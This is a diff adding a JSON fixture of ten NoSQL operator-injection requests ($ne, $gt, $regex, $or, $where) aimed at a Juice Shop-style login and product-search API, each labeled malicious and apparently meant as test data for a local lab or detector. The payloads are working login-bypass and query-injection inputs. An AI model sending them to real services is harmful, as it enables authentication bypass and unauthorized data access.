@@ -1,0 +1,81 @@
+{
+  "_comment": "NoSQL operator-injection probes. Local range only.",
+  "dossier": {
+    "techniques": [
+      "other"
+    ],
+    "attack_class": "other",
+    "endpoints": [
+      "/rest/user/login",
+      "/rest/products/search"
+    ]
+  },
+  "requests": [
+    {
+      "method": "POST",
+      "uri": "/rest/user/login",
+      "body": "{\"email\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/rest/user/login",
+      "body": "{\"email\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/rest/user/login",
+      "body": "{\"email\": {\"$regex\": \".*\"}, \"password\": \"x\"}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/rest/user/login",
+      "body": "{\"email\": \"admin@juice-sh.op\", \"password\": {\"$ne\": \"x\"}}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/rest/user/login",
+      "body": "{\"email\": {\"$or\": [{\"a\": 1}, {\"b\": 2}]}, \"password\": \"x\"}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/rest/user/login",
+      "body": "{\"email\": {\"$where\": \"1==1\"}, \"password\": \"x\"}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=x%5B%24ne%5D=1",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=x%5B%24gt%5D=",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=x%5B%24regex%5D=.%2A",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=x%5B%24where%5D=1",
+      "body": "",
+      "malicious": true
+    }
+  ]
+}
